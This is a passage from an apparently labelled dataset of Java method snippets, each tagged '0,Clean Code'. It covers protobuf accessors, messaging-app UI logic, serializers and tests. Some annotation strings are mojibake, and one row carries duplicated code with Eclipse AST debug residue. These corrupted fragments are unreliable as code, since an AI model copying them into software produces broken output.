  return this.msg;
}",0,Clean Code
"@Override public void changedY(final CBend bend,final double y){
  final int index=m_rawEdge.getBends().indexOf(bend);
  final Bend rbend=m_realizer.getBend(index);
  rbend.setLocation(rbend.getX(),y);
}
",0,Clean Code
"@Test void should_find_relevant_with_filter(){
  TextSegment segment=TextSegment.from(""this segment should be found"",Metadata.from(""test-key"",""test-value""));
  Embedding embedding=embeddingModel.embed(segment.text()).content();
  TextSegment filterSegment=TextSegment.from(""this segment should not be found"",Metadata.from(""test-key"",""no-value""));
  Embedding filterEmbedding=embeddingModel.embed(filterSegment.text()).content();
  List<String> ids=embeddingStore.addAll(asList(embedding,filterEmbedding),asList(segment,filterSegment));
  assertThat(ids).hasSize(2);
  TextSegment refSegment=TextSegment.from(""find a segment"");
  Embedding refEmbedding=embeddingModel.embed(refSegment.text()).content();
  awaitUntilPersisted();
  List<EmbeddingMatch<TextSegment>> relevant=embeddingStore.findRelevant(refEmbedding,2);
  assertThat(relevant).hasSize(1);
  EmbeddingMatch<TextSegment> match=relevant.get(0);
  assertThat(match.score()).isCloseTo(0.88,withPercentage(1));
  assertThat(match.embeddingId()).isEqualTo(ids.get(0));
  assertThat(match.embedding()).isEqualTo(embedding);
  assertThat(match.embedded()).isEqualTo(segment);
}",0,Clean Code
"public void toggleSecondaryPerspective(){
  if (settings.getDiffViewMode() == EDiffViewMode.NORMAL_VIEW) {
    viewTabPanel.getNormalViewPanel().toggleSecondaryPerspective();
  }
}
",0,Clean Code
"protected Expression skipFinalClassInfo(Class<?> cls,Expression buffer){
  Preconditions.checkArgument(ReflectionUtils.isMonomorphic(cls));
  ClassInfo classInfo=visitFury(f -> f.getClassResolver().getClassInfo(cls,false));
  if (classInfo != null && classInfo.getClassId() != ClassResolver.NO_CLASS_ID) {
    return classResolver.skipRegisteredClassExpr(buffer);
  }
  return readClassInfo(cls,buffer,false);
}
",0,Clean Code
"public static MinecraftAccount load(String name){
  if (!accountExists(name))   return null;
  try {
    MinecraftAccount acc=parse(Tools.read(Tools.DIR_ACCOUNT_NEW + ""/"" + name+ "".json""));
    if (acc.accessToken == null) {
      acc.accessToken=""0"";
    }
    if (acc.clientToken == null) {
      acc.clientToken=""0"";
    }
    if (acc.profileId == null) {
      acc.profileId=""00000000-0000-0000-0000-000000000000"";
    }
    if (acc.username == null) {
      acc.username=""0"";
    }
    if (acc.selectedVersion == null) {
      acc.selectedVersion=""1.7.10"";
    }
    if (acc.msaRefreshToken == null) {
      acc.msaRefreshToken=""0"";
    }
    return acc;
  }
 catch (  IOException|JsonSyntaxException e) {
    Log.e(MinecraftAccount.class.getName(),""Caught an exception while loading the profile"",e);
    return null;
  }
}",0,Clean Code
"public GProBlockItem(){
  this.serialVersionUID=1L;
  this.blockId="""";
  this.blockName="""";
  this.itemList=new ArrayList<>();
}
public GProBlockItem(String str,int i2,String str2,ArrayList<GProItemIdInfo> arrayList){
  this.serialVersionUID=1L;
  this.blockId="""";
  this.blockName="""";
  this.itemList=new ArrayList<>();
  this.blockId=str;
  this.blockType=i2;
  this.blockName=str2;
  this.itemList=arrayList;
}",0,Clean Code
"/** 
 * @param apiHostValue
 * @return
 */
public FastChatAIStreamClient.Builder apiHost(String apiHostValue){
  this.apiHost=apiHostValue;
  return this;
}
",0,Clean Code
"/** 
 * <code>optional uint32 goods_id = 13;</code>
 * @param value the goodsId to set
 * @return this
 */
public Goods setGoodsId(final int value){
  bitField0_|=0x00000008;
  goodsId=value;
  return this;
}",0,Clean Code
"@Override public GetFirstTalkNpcCsReq clone(){
  return new GetFirstTalkNpcCsReq().copyFrom(this);
}
",0,Clean Code
"@Test public void testZrangeByScore(){
  jedisCluster.zrangeByScore(""key"",""min"",""max"");
  jedisCluster.zrangeByScore(""key"",1337,1338);
  jedisCluster.zrangeByScore(""key"",""min"",""max"",1337,1338);
  jedisCluster.zrangeByScore(""key"",1337,1338,1339,1340);
}",0,Clean Code
"public long getRoleId(){
  return this.roleId;
}
",0,Clean Code
"/** 
 * <code>repeated .RogueMiracleDataInfo.KONAGCDHKKHEntry KONAGCDHKKH = 15;</code>
 * @param value the kONAGCDHKKH to add
 * @return this
 */
public RogueMiracleDataInfo addKONAGCDHKKH(final KONAGCDHKKHEntry value){
  bitField0_|=0x00000010;
  kONAGCDHKKH.add(value);
  return this;
}",0,Clean Code
"public String getDefinition(){
  return this.definition;
}
",0,Clean Code
"@Override public double getY2(){
  return 0;
}",0,Clean Code
"public void search() throws ArgumentsMissMatchException {
  String tips=""search <keyword>\n"" + ""search {payload/exploit/bullet} <keyword>\n"";
  if (args.size() == 1) {
    String keyword=args.get(0);
    if (""-h"".equals(keyword) || ""help"".equals(keyword)) {
      Logger.normal(tips);
      return;
    }
    Printer.printExploitsInfo(getFilterList(exploits,keyword));
    Printer.printPayloadsInfo(getFilterList(payloads,keyword));
    Printer.printBulletsInfo(getFilterList(bullets,keyword));
    return;
  }
 else   if (args.size() == 2) {
    String type=args.get(0);
    String keyword=args.get(1);
switch (type) {
case ""exploit"":
case ""exploits"":
      Printer.printExploitsInfo(getFilterList(exploits,keyword));
    return;
case ""payload"":
case ""payloads"":
  Printer.printPayloadsInfo(getFilterList(payloads,keyword));
return;
case ""bullet"":
case ""bullets"":
Printer.printBulletsInfo(getFilterList(bullets,keyword));
return;
}
}
throw new ArgumentsMissMatchException(tips);
}",0,Clean Code
"public void updateFieldHint(boolean animated){
  if (messageEditText == null) {
    return;
  }
  if (!sendPlainEnabled && !isEditingMessage()) {
    SpannableStringBuilder spannableStringBuilder=new SpannableStringBuilder("" d "" + LocaleController.getString(""PlainTextRestrictedHint"",R.string.PlainTextRestrictedHint));
    spannableStringBuilder.setSpan(new ColoredImageSpan(R.drawable.msg_mini_lock3),1,2,0);
    messageEditText.setHintText(spannableStringBuilder,animated);
    messageEditText.setText(null);
    messageEditText.setEnabled(false);
    messageEditText.setInputType(EditorInfo.IME_ACTION_NONE);
    return;
  }
 else {
    messageEditText.setEnabled(true);
    messageEditText.setInputType(commonInputType);
  }
  if (replyingMessageObject != null && replyingMessageObject.messageOwner.reply_markup != null && !TextUtils.isEmpty(replyingMessageObject.messageOwner.reply_markup.placeholder)) {
    messageEditText.setHintText(replyingMessageObject.messageOwner.reply_markup.placeholder,animated);
  }
 else   if (editingMessageObject != null) {
    messageEditText.setHintText(editingCaption ? LocaleController.getString(""Caption"",R.string.Caption) : LocaleController.getString(""TypeMessage"",R.string.TypeMessage));
  }
 else   if (botKeyboardViewVisible && botButtonsMessageObject != null && botButtonsMessageObject.messageOwner.reply_markup != null && !TextUtils.isEmpty(botButtonsMessageObject.messageOwner.reply_markup.placeholder)) {
    messageEditText.setHintText(botButtonsMessageObject.messageOwner.reply_markup.placeholder,animated);
  }
 else {
    boolean isChannel=false;
    boolean anonymously=false;
    if (DialogObject.isChatDialog(dialog_id)) {
      TLRPC.Chat chat=accountInstance.getMessagesController().getChat(-dialog_id);
      TLRPC.ChatFull chatFull=accountInstance.getMessagesController().getChatFull(-dialog_id);
      isChannel=ChatObject.isChannel(chat) && !chat.megagroup;
      anonymously=ChatObject.getSendAsPeerId(chat,chatFull) == chat.id;
    }
    if (anonymously) {
      messageEditText.setHintText(LocaleController.getString(""SendAnonymously"",R.string.SendAnonymously));
    }
 else {
      if (parentFragment != null && parentFragment.isThreadChat() && !parentFragment.isTopic) {
        if (parentFragment.isReplyChatComment()) {
          messageEditText.setHintText(LocaleController.getString(""Comment"",R.string.Comment));
        }
 else {
          messageEditText.setHintText(LocaleController.getString(""Reply"",R.string.Reply));
        }
      }
 else       if (isChannel) {
        if (silent) {
          messageEditText.setHintText(LocaleController.getString(""ChannelSilentBroadcast"",R.string.ChannelSilentBroadcast),animated);
        }
 else {
          messageEditText.setHintText(LocaleController.getString(""ChannelBroadcast"",R.string.ChannelBroadcast),animated);
        }
      }
 else {
        messageEditText.setHintText(LocaleController.getString(""TypeMessage"",R.string.TypeMessage));
      }
    }
  }
}",0,Clean Code
"private JPopupMenu createPopup(){
  final JPopupMenu popup=new JPopupMenu();
  popup.add(GuiUtils.buildMenuItem(""Search Node Contents"",ICON_NORMAL_SEARCH,popupChooserAction));
  popup.add(new JSeparator());
  popup.add(GuiUtils.buildMenuItem(""Jump to Primary Address"",ICON_JUMP_TO_PRIMARY_ADDRESS,popupChooserAction));
  popup.add(GuiUtils.buildMenuItem(""Jump to Secondary Address"",ICON_JUMP_TO_SECONDARY_ADDRESS,popupChooserAction));
  return popup;
}
",0,Clean Code
"/** 
 * <code>optional uint32 relic_unique_id = 15;</code>
 * @return this
 */
public LockRelicScRsp clearRelicUniqueId(){
  bitField0_&=~0x00000002;
  relicUniqueId=0;
  return this;
}",0,Clean Code
"@Override public void onWebAppSwitchInlineQuery(TLRPC.User botUser,String query,List<String> chatTypes){
  if (chatTypes.isEmpty()) {
    if (parentActivity instanceof LaunchActivity) {
      BaseFragment lastFragment=((LaunchActivity)parentActivity).getActionBarLayout().getLastFragment();
      if (lastFragment instanceof ChatActivity) {
        ((ChatActivity)lastFragment).getChatActivityEnterView().setFieldText(""@"" + UserObject.getPublicUsername(botUser) + "" ""+ query);
        dismiss();
      }
    }
  }
 else {
    Bundle args=new Bundle();
    args.putInt(""dialogsType"",DialogsActivity.DIALOGS_TYPE_START_ATTACH_BOT);
    args.putBoolean(""onlySelect"",true);
    args.putBoolean(""allowGroups"",chatTypes.contains(""groups""));
    args.putBoolean(""allowMegagroups"",chatTypes.contains(""groups""));
    args.putBoolean(""allowLegacyGroups"",chatTypes.contains(""groups""));
    args.putBoolean(""allowUsers"",chatTypes.contains(""users""));
    args.putBoolean(""allowChannels"",chatTypes.contains(""channels""));
    args.putBoolean(""allowBots"",chatTypes.contains(""bots""));
    DialogsActivity dialogsActivity=new DialogsActivity(args);
    AndroidUtilities.hideKeyboard(frameLayout);
    OverlayActionBarLayoutDialog overlayActionBarLayoutDialog=new OverlayActionBarLayoutDialog(context,resourcesProvider);
    dialogsActivity.setDelegate((fragment,dids,message1,param,topicsFragment) -> {
      long did=dids.get(0).dialogId;
      Bundle args1=new Bundle();
      args1.putBoolean(""scrollToTopOnResume"",true);
      if (DialogObject.isEncryptedDialog(did)) {
        args1.putInt(""enc_id"",DialogObject.getEncryptedChatId(did));
      }
 else       if (DialogObject.isUserDialog(did)) {
        args1.putLong(""user_id"",did);
      }
 else {
        args1.putLong(""chat_id"",-did);
      }
      args1.putString(""start_text"",""@"" + UserObject.getPublicUsername(botUser) + "" ""+ query);
      if (parentActivity instanceof LaunchActivity) {
        BaseFragment lastFragment=((LaunchActivity)parentActivity).getActionBarLayout().getLastFragment();
        if (MessagesController.getInstance(currentAccount).checkCanOpenChat(args1,lastFragment)) {
          overlayActionBarLayoutDialog.dismiss();
          dismissed=true;
          AndroidUtilities.cancelRunOnUIThread(pollRunnable);
          webViewContainer.destroyWebView();
          NotificationCenter.getInstance(currentAccount).removeObserver(BotWebViewSheet.this,NotificationCenter.webViewResultSent);
          NotificationCenter.getGlobalInstance().removeObserver(BotWebViewSheet.this,NotificationCenter.didSetNewTheme);
          BotWebViewSheet.super.dismiss();
          lastFragment.presentFragment(new INavigationLayout.NavigationParams(new ChatActivity(args1)).setRemoveLast(true));
        }
      }
      return true;
    }
);
    overlayActionBarLayoutDialog.show();
    overlayActionBarLayoutDialog.addFragment(dialogsActivity);
  }
}",0,Clean Code
"@Override public KONAGCDHKKHEntry mergeFrom(final KONAGCDHKKHEntry other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasKey()) {
    setKey(other.key);
  }
  if (other.hasValue()) {
    setValue(other.value_);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@40325354!org.eclipse.jdt.core.dom.MethodDeclaration@5a1a0fe4@Override public KONAGCDHKKHEntry mergeFrom(final KONAGCDHKKHEntry other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasKey()) {
    setKey(other.key);
  }
  if (other.hasValue()) {
    setValue(other.value_);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@82cacb2!org.eclipse.jdt.core.dom.MethodDeclaration@648859f3",0,Clean Code
"public String getContent(){
  return this.content;
}
",0,Clean Code
"private void startRinging(){
  if (currentState == STATE_WAITING_INCOMING) {
    return;
  }
  if (USE_CONNECTION_SERVICE && systemCallConnection != null) {
    systemCallConnection.setRinging();
  }
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""starting ringing for call "" + privateCall.id);
  }
  dispatchStateChanged(STATE_WAITING_INCOMING);
  if (!notificationsDisabled && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
    showIncomingNotification(ContactsController.formatName(user.first_name,user.last_name),null,user,privateCall.video,0);
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""Showing incoming call notification"");
    }
  }
 else {
    startRingtoneAndVibration(user.id);
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""Starting incall activity for incoming call"");
    }
    try {
      PendingIntent.getActivity(VoIPService.this,12345,new Intent(VoIPService.this,LaunchActivity.class).setAction(""voip""),PendingIntent.FLAG_MUTABLE).send();
    }
 catch (    Exception x) {
      if (BuildVars.LOGS_ENABLED) {
        FileLog.e(""Error starting incall activity"",x);
      }
    }
  }
}",0,Clean Code
"@Override public UnlockSkilltreeScRsp create(){
  return UnlockSkilltreeScRsp.newInstance();
}
",0,Clean Code
"/** 
 * <code>optional uint64 secret_key_seed = 7;</code>
 * @return whether the secretKeySeed field is set
 */
public boolean hasSecretKeySeed(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"public TongyiChatAIStreamClient.Builder embeddingModel(String embeddingModelValue){
  this.embeddingModel=embeddingModelValue;
  return this;
}
",0,Clean Code
"public static TypeRef<?> getElemReturnType(TypeRef<?> type){
  if (TypeUtils.PRIMITIVE_BYTE_TYPE.equals(type) || TypeUtils.BYTE_TYPE.equals(type)) {
    return TypeUtils.PRIMITIVE_BYTE_TYPE;
  }
 else   if (TypeUtils.PRIMITIVE_BOOLEAN_TYPE.equals(type) || TypeUtils.BOOLEAN_TYPE.equals(type)) {
    return TypeUtils.PRIMITIVE_BOOLEAN_TYPE;
  }
 else   if (TypeUtils.PRIMITIVE_SHORT_TYPE.equals(type) || TypeUtils.SHORT_TYPE.equals(type)) {
    return TypeUtils.PRIMITIVE_SHORT_TYPE;
  }
 else   if (TypeUtils.PRIMITIVE_INT_TYPE.equals(type) || TypeUtils.INT_TYPE.equals(type)) {
    return TypeUtils.PRIMITIVE_INT_TYPE;
  }
 else   if (TypeUtils.PRIMITIVE_LONG_TYPE.equals(type) || TypeUtils.LONG_TYPE.equals(type)) {
    return TypeUtils.PRIMITIVE_LONG_TYPE;
  }
 else   if (TypeUtils.PRIMITIVE_FLOAT_TYPE.equals(type) || TypeUtils.FLOAT_TYPE.equals(type)) {
    return TypeUtils.PRIMITIVE_FLOAT_TYPE;
  }
 else   if (TypeUtils.PRIMITIVE_DOUBLE_TYPE.equals(type) || TypeUtils.DOUBLE_TYPE.equals(type)) {
    return TypeUtils.PRIMITIVE_DOUBLE_TYPE;
  }
 else   if (TypeUtils.BIG_DECIMAL_TYPE.equals(type)) {
    return TypeUtils.BIG_DECIMAL_TYPE;
  }
 else   if (TypeUtils.DATE_TYPE.equals(type)) {
    return TypeUtils.INT_TYPE;
  }
 else   if (TypeUtils.TIMESTAMP_TYPE.equals(type)) {
    return TypeUtils.LONG_TYPE;
  }
 else   if (TypeUtils.STRING_TYPE.equals(type)) {
    return TypeUtils.STRING_TYPE;
  }
 else   if (type.isArray() || TypeUtils.ITERABLE_TYPE.isSupertypeOf(type)) {
    return TypeRef.of(BinaryArray.class);
  }
 else   if (TypeUtils.MAP_TYPE.isSupertypeOf(type)) {
    return TypeRef.of(BinaryMap.class);
  }
 else   if (TypeUtils.isBean(type)) {
    return TypeRef.of(BinaryRow.class);
  }
 else {
    return TypeRef.of(MemoryBuffer.class);
  }
}
",0,Clean Code
"@Override public SyncRogueCommonActionResultScNotify clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  actionResultList.clearQuick();
  return this;
}",0,Clean Code
"@Override public GachaCeiling clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  ceilingNum=0;
  isClaimed=false;
  avatarList.clear();
  return this;
}",0,Clean Code
"/** 
 * Joins the lines of the prompt template.
 * @param structuredPrompt the structured prompt.
 * @return the joined prompt template.
 */
public static String join(StructuredPrompt structuredPrompt){
  return String.join(structuredPrompt.delimiter(),structuredPrompt.value());
}
",0,Clean Code
"@Override public RawInstruction getPersistentModel(){
  return rawInstruction;
}
",0,Clean Code
"@ApiOperation(""淇濆瓨妯℃澘"") @PostMapping(""/saveTemplate"") public Result queryTemplateList(@RequestBody AchievementsTemplateBO achievementsTemplateBO){
  assessmentTemplateService.addOrUpdate(achievementsTemplateBO);
  return Result.ok(null);
}
@ApiOperation(""鍒犻櫎妯℃澘"") @PostMapping(""/delTemplate"") public Result queryTemplateList(@RequestBody OperationReq operationReq){
  assessmentTemplateService.deleteByIdList(operationReq);
  return Result.ok(null);
}
@ApiOperation(""妯℃澘璇︽儏"") @PostMapping(""/information/{templateId}"") public Result<AchievementsTemplateVO> queryTemplateList(@PathVariable(""templateId"") Long templateId){
  AchievementsTemplateVO achievementsTemplateVO=assessmentTemplateService.information(templateId);
  return Result.ok(achievementsTemplateVO);
}
",0,Clean Code
"@Override protected LayoutManager createLayoutManager(){
  return new MaterialChromeTabbedPaneLayout();
}
",0,Clean Code
"@Override public String forSelectEntityListByIds(TableInfo tableInfo,Object[] primaryValues){
  StringBuilder sql=new StringBuilder();
  buildSelectColumnSql(sql,null,tableInfo.getDefaultQueryColumn(),null);
  sql.append(FROM).append(tableInfo.getWrapSchemaAndTableName(this,OperateType.SELECT));
  sql.append(WHERE);
  String[] primaryKeys=tableInfo.getPrimaryColumns();
  String logicDeleteColumn=tableInfo.getLogicDeleteColumnOrSkip();
  Object[] tenantIdArgs=tableInfo.buildTenantIdArgs();
  if (StringUtil.isNotBlank(logicDeleteColumn) || ArrayUtil.isNotEmpty(tenantIdArgs)) {
    sql.append(BRACKET_LEFT);
  }
  if (primaryKeys.length > 1) {
    for (int i=0; i < primaryValues.length / primaryKeys.length; i++) {
      if (i > 0) {
        sql.append(OR);
      }
      sql.append(BRACKET_LEFT);
      for (int j=0; j < primaryKeys.length; j++) {
        if (j > 0) {
          sql.append(AND);
        }
        sql.append(wrap(primaryKeys[j])).append(EQUALS_PLACEHOLDER);
      }
      sql.append(BRACKET_RIGHT);
    }
  }
 else {
    for (int i=0; i < primaryValues.length; i++) {
      if (i > 0) {
        sql.append(OR);
      }
      sql.append(wrap(primaryKeys[0])).append(EQUALS_PLACEHOLDER);
    }
  }
  if (StringUtil.isNotBlank(logicDeleteColumn) || ArrayUtil.isNotEmpty(tenantIdArgs)) {
    sql.append(BRACKET_RIGHT);
  }
  if (StringUtil.isNotBlank(logicDeleteColumn)) {
    sql.append(AND).append(buildLogicNormalCondition(logicDeleteColumn,tableInfo));
  }
  tableInfo.buildTenantCondition(sql,tenantIdArgs,this);
  prepareAuth(tableInfo,sql,OperateType.SELECT);
  return sql.toString();
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.tree.protos.TreeModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.common.tree.protos.TreeModelProto other=(org.tribuo.common.tree.protos.TreeModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (!getNodesList().equals(other.getNodesList()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"private DelMailScRsp(){
}
",0,Clean Code
"@SneakyThrows public Object[] getIndexValues(IndexInfo indexInfoVO){
  Object[] values=new Object[IndexInfo.class.getDeclaredFields().length];
  values[0]=dealWith(indexInfoVO.getName());
  values[1]=dealWith(indexInfoVO.getColumnName());
  values[2]=dealWith(indexInfoVO.getIndexType());
  values[3]=dealWith(indexInfoVO.getIndexMethod());
  values[4]=dealWith(indexInfoVO.getComment());
  return values;
}",0,Clean Code
"@Specialization protected VmMap eval(VmDynamic self){
  var builder=VmMap.builder();
  self.forceAndIterateMemberValues((key,member,value) -> {
    if (!member.isElement()) {
      builder.add(key instanceof Identifier ? key.toString() : key,value);
    }
    return true;
  }
);
  return builder.build();
}
@Specialization protected VmMap eval(VmList self,VmFunction keyExtractor,VmFunction valueExtractor){
  var builder=VmMap.builder();
  for (  var elem : self) {
    var key=applyKeyExtractorNode.execute(keyExtractor,elem);
    var value=applyValueExtractorNode.execute(valueExtractor,elem);
    builder.add(key,value);
  }
  LoopNode.reportLoopCount(this,self.getLength());
  return builder.build();
}
@Specialization protected VmMap eval(VmMap self){
  return self;
}
@Specialization protected VmMap eval(VmMapping self){
  var builder=VmMap.builder();
  self.forceAndIterateMemberValues((key,def,value) -> {
    builder.add(key,value);
    return true;
  }
);
  return builder.build();
}
@Specialization protected VmMap eval(VmSet self,VmFunction keyExtractor,VmFunction valueExtractor){
  var builder=VmMap.builder();
  for (  var elem : self) {
    var key=applyKeyExtractorNode.execute(keyExtractor,elem);
    var value=applyValueExtractorNode.execute(valueExtractor,elem);
    builder.add(key,value);
  }
  LoopNode.reportLoopCount(this,self.getLength());
  return builder.build();
}
@Specialization protected VmMap eval(VmTyped self){
  var builder=VmMap.builder();
  self.forceAndIterateMemberValues((memberKey,memberDef,memberValue) -> {
    if (memberDef.isClass() || memberDef.isTypeAlias())     return true;
    builder.add(memberKey.toString(),memberValue);
    return true;
  }
);
  return builder.build();
}
",0,Clean Code
"private void checkPhotoDescriptionAlpha(){
  float p=photoDescriptionProgress;
  if (playProfileAnimation == 1 && (!fragmentOpened || openAnimationInProgress)) {
    photoDescriptionProgress=0;
  }
 else   if (playProfileAnimation == 2 && (!fragmentOpened || openAnimationInProgress)) {
    photoDescriptionProgress=onlineTextView[1] == null ? 0 : onlineTextView[1].getAlpha();
  }
 else {
    if (userId == UserConfig.getInstance(currentAccount).clientUserId) {
      photoDescriptionProgress=currentExpandAnimatorValue * (1f - customAvatarProgress);
    }
 else {
      photoDescriptionProgress=currentExpandAnimatorValue * customAvatarProgress;
    }
  }
  if (userId == UserConfig.getInstance(currentAccount).clientUserId) {
    if (hasFallbackPhoto) {
      customPhotoOffset=AndroidUtilities.dp(28) * photoDescriptionProgress;
      if (onlineTextView[2] != null) {
        onlineTextView[2].setAlpha(currentExpandAnimatorValue);
        onlineTextView[3].setAlpha(1f - currentExpandAnimatorValue);
        onlineTextView[1].setTranslationX(onlineX + customPhotoOffset);
        avatarContainer2.invalidate();
      }
    }
 else {
      if (onlineTextView[2] != null) {
        onlineTextView[2].setAlpha(0);
        onlineTextView[3].setAlpha(0);
      }
    }
  }
 else {
    if (hasCustomPhoto) {
      if (onlineTextView[2] != null) {
        onlineTextView[2].setAlpha(photoDescriptionProgress);
      }
    }
 else {
      if (onlineTextView[2] != null) {
        onlineTextView[2].setAlpha(0);
      }
    }
  }
}",0,Clean Code
"/** 
 * {@return the immutable configuration}
 */
public WeaviateVectorStoreConfig build(){
  return new WeaviateVectorStoreConfig(this);
}
",0,Clean Code
"public void readFields(MemoryBuffer buffer,Object[] vals){
  int startIndex=0;
  long partFieldInfo=readEmbedTypes4Fields(buffer,null,vals,startIndex);
  long endTag=fieldResolver.getEndTag();
  if (partFieldInfo == endTag) {
    return;
  }
  startIndex+=fieldResolver.getEmbedTypes4Fields().length;
  long tmp=buffer.readInt32();
  partFieldInfo=tmp << 32 | (partFieldInfo & 0x00000000ffffffffL);
  partFieldInfo=readEmbedTypes9Fields(buffer,partFieldInfo,null,vals,startIndex);
  if (partFieldInfo == endTag) {
    return;
  }
  startIndex+=fieldResolver.getEmbedTypes9Fields().length;
  partFieldInfo=readEmbedTypesHashFields(buffer,partFieldInfo,null,vals,startIndex);
  if (partFieldInfo == endTag) {
    return;
  }
  startIndex+=fieldResolver.getEmbedTypesHashFields().length;
  readSeparateTypesHashField(buffer,partFieldInfo,null,vals,startIndex);
}",0,Clean Code
"/** 
 * <code>optional uint32 src_slot = 5;</code>
 * @return this
 */
public SwapLineupCsReq clearSrcSlot(){
  bitField0_&=~0x00000004;
  srcSlot=0;
  return this;
}",0,Clean Code
"@Override public void init() throws NoSuchMethodException {
  MethodData methodData=DexKit.getDexKitBridge().findMethod(FindMethod.create().matcher(MethodMatcher.create().usingStrings(""getBoolean"",""SystemProperties"",""Exception while getting system property: ""))).singleOrThrow(() -> new IllegalStateException(""EnableLabOptions: Cannot found MethodData""));
  Method method=methodData.getMethodInstance(lpparam.classLoader);
  logD(TAG,lpparam.packageName,""Unlock camera.lab.options method is "" + method);
  hookMethod(method,new MethodHook(){
    @Override protected void before(    MethodHookParam param) throws Throwable {
      String mStr=(String)param.args[0];
      if (Objects.equals(mStr,""camera.lab.options""))       param.setResult(true);
    }
  }
);
}",0,Clean Code
"@Specialization protected double eval(VmTyped self){
  return StrictMath.E;
}
",0,Clean Code
"/** 
 * <code>repeated .RogueMiracleDataInfo.KONAGCDHKKHEntry KONAGCDHKKH = 15;</code>
 * @return this
 */
public RogueMiracleDataInfo clearKONAGCDHKKH(){
  bitField0_&=~0x00000010;
  kONAGCDHKKH.clear();
  return this;
}",0,Clean Code
"/** 
 * Registering serializers for synchronized Collections and Maps created via  {@link Collections}.
 * @see Collections#synchronizedCollection(Collection)
 * @see Collections#synchronizedList(List)
 * @see Collections#synchronizedSet(Set)
 * @see Collections#synchronizedSortedSet(SortedSet)
 * @see Collections#synchronizedMap(Map)
 * @see Collections#synchronizedSortedMap(SortedMap)
 */
public static void registerSerializers(Fury fury){
  try {
    for (    Tuple2<Class<?>,Function> factory : synchronizedFactories()) {
      fury.registerSerializer(factory.f0,createSerializer(fury,factory));
    }
  }
 catch (  Throwable e) {
    ExceptionUtils.ignore(e);
  }
}",0,Clean Code
"/** 
 * <code>optional bool b4 = 3;</code>
 * @param value the b4 to set
 * @return this
 */
public PlayerSettingInfo setB4(final boolean value){
  bitField0_|=0x00000004;
  b4=value;
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 FKBLOGEAFJJ = 2;</code>
 * @param value the fKBLOGEAFJJ to set
 * @return this
 */
public PlayerRecordInfo setFKBLOGEAFJJ(final int value){
  bitField0_|=0x00000002;
  fKBLOGEAFJJ=value;
  return this;
}",0,Clean Code
"protected String doGetUserQuestion(EvaluationRequest evaluationRequest){
  List<Message> instructions=evaluationRequest.getPrompt().getInstructions();
  String userMessage=instructions.stream().filter(m -> m.getMessageType() == MessageType.USER).map(m -> m.getContent()).collect(Collectors.joining(System.lineSeparator()));
  return userMessage;
}
",0,Clean Code
"public final void setFileLogging(final boolean fileLogging){
  Config.getInstance().getLogBuilder().setToFile(fileLogging);
}
",0,Clean Code
"@Bean public VectorStore hanaCloudVectorStore(CricketWorldCupRepository cricketWorldCupRepository,EmbeddingClient embeddingClient){
  return new HanaCloudVectorStore(cricketWorldCupRepository,embeddingClient,HanaCloudVectorStoreConfig.builder().tableName(""CRICKET_WORLD_CUP"").topK(1).build());
}",0,Clean Code
"@Override public boolean onMenuItemSelected(MenuItem item){
  int id=item.getItemId();
  if (id == R.id.paid_features) {
    showLicenseDialog();
    return true;
  }
 else   if (id == R.id.on_boarding) {
    Intent intent=new Intent(this,OnBoardingActivity.class);
    intent.putExtra(OnBoardingActivity.ENABLE_BACK_BUTTON,true);
    startActivity(intent);
    return true;
  }
 else   if (id == R.id.build_info) {
    String deviceInfo=Utils.getBuildInfo(this) + ""\n\n"" + Prefs.asString(this);
    Utils.PrivateDnsMode dns_mode=CaptureService.getPrivateDnsMode();
    if (dns_mode == null) {
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
        ConnectivityManager cm=(ConnectivityManager)getSystemService(Service.CONNECTIVITY_SERVICE);
        Network net=cm.getActiveNetwork();
        if (net != null) {
          LinkProperties lp=cm.getLinkProperties(net);
          if (lp != null)           dns_mode=Utils.getPrivateDnsMode(lp);
        }
      }
    }
    if (dns_mode != null)     deviceInfo+=""\n"" + ""PrivateDnsMode: "" + dns_mode;
    deviceInfo+=""\n"" + ""MitmBatteryOptimized: "" + ((MitmAddon.isInstalled(this) && MitmAddon.isDozeEnabled(this)) ? ""true"" : ""false"");
    LayoutInflater inflater=LayoutInflater.from(this);
    View view=inflater.inflate(R.layout.scrollable_dialog,null);
    ((TextView)view.findViewById(R.id.text)).setText(deviceInfo);
    final String deviceInfoStr=deviceInfo;
    new AlertDialog.Builder(this).setTitle(R.string.build_info).setView(view).setPositiveButton(R.string.ok,(dialogInterface,i) -> {
    }
).setNeutralButton(R.string.copy_to_clipboard,(dialogInterface,i) -> Utils.copyToClipboard(this,deviceInfoStr)).show();
    return true;
  }
  return false;
}
",0,Clean Code
"/** 
 * <code>optional uint32 goods_id = 8;</code>
 * @return the goodsId
 */
public int getGoodsId(){
  return goodsId;
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.DatasetViewProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.DatasetViewProto other=(org.tribuo.protos.core.DatasetViewProto)obj;
  if (hasInnerDataset() != other.hasInnerDataset())   return false;
  if (hasInnerDataset()) {
    if (!getInnerDataset().equals(other.getInnerDataset()))     return false;
  }
  if (hasFeatureDomain() != other.hasFeatureDomain())   return false;
  if (hasFeatureDomain()) {
